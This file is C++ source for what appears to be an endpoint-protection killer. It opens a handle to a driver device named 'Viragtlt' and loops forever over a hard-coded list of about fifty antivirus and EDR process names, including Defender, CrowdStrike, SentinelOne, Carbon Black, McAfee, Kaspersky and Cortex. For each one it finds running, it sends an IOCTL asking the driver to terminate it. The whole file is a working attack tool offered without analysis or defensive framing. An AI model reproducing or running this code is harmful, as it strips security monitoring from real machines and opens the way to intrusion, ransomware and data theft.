// viragt64.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wchar.h>
#include <signal.h>

#define DRIVER_NAME L"viragt64"
#define IOCTL_CODE 0x82730030

const wchar_t* edrNames[] = { L"MsMpEng.exe", L"SecurityHealthService.exe", L"SecurityHealthSystray.exe", L"MsSense.exe", L"SenseNdr.exe", L"SenseTVM.exe", L"NisSrv.exe", L"MpCmdRun.exe", L"MpSigStub.exe", L"ConfigSecurityPolicy.exe", L"smartscreen.exe", L"CSFalconService.exe", L"CSFalconContainer.exe", L"CSAgent.exe", L"falcon-sensor.exe", L"SentinelAgent.exe", L"SentinelAgentWorker.exe", L"SentinelServiceHost.exe", L"SentinelStaticEngine.exe", L"cb.exe", L"cbstream.exe", L"carbonblack.exe", L"RepMgr.exe", L"RepUtils.exe", L"RepUx.exe", L"ccSvcHst.exe", L"SymCorpUI.exe", L"SEPM.exe", L"SmcGui.exe", L"smc.exe", L"ccApp.exe", L"McShield.exe", L"mfevtps.exe", L"mfeann.exe", L"mcapexe.exe", L"ModuleCoreService.exe", L"mfemms.exe", L"PccNTMon.exe", L"ntrtscan.exe", L"tmlisten.exe", L"CNTAoSMgr.exe", L"TmCCSF.exe", L"avp.exe", L"kavtray.exe", L"klnagent.exe", L"ksde.exe", L"cytray.exe", L"cyserver.exe", L"CyveraService.exe", L"xagt.exe", L"fe_avk.exe", L"HX.exe" };

const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);

typedef struct _TERMINATE_STRUCTURE {
    char PROCESS_NAME[256];
}TERMINATE_STRUCTURE, * PTERMINATE_STRUCTURE;

BOOL FindEDR(const wchar_t* processName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (wcscmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return TRUE;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return FALSE;
}

int wmain(int argc, wchar_t* argv[])
{
    printf("[+] Opening handle to device..\n");
    HANDLE hDriver = CreateFileW(
        L"\\\\.\\Viragtlt",
        GENERIC_WRITE | GENERIC_READ,
        0,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr);

    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Failed to open handle: %d", GetLastError());
        return 1;
    }

    while (true) {
        for (size_t i = 0; i < edrCount; i++) {

            BOOL EDRPID;
            EDRPID = FindEDR(edrNames[i]);

            if (EDRPID) {

                wprintf(L"[+] Calling ProcessTerminator to Kill %ls....", edrNames[i]);

                char EDR_NAME[256];
                int result = WideCharToMultiByte(
                    CP_ACP,              // Code page (ANSI)
                    0,                   // Flags
                    edrNames[i],         // Wide char string
                    -1,                  // Null-terminated input
                    EDR_NAME,         // Output buffer
                    sizeof(EDR_NAME), // Size of buffer
                    NULL,                // Default char
                    NULL                 // Used default char?
                );

                TERMINATE_STRUCTURE EDRProcess = { 0 };
                strcpy_s(EDRProcess.PROCESS_NAME, sizeof(EDRProcess.PROCESS_NAME), EDR_NAME);

                // Terminate EDR
                NTSTATUS success = DeviceIoControl(
                    hDriver,
                    IOCTL_CODE,
                    &EDRProcess,
                    sizeof(EDRProcess),
                    nullptr,
                    0,
                    nullptr,
                    nullptr);

                if (success) {
                    printf("success\n");
                }
                else {
                    printf("failed\n");
                }
            }
        }
    }

    Sleep(1000);
}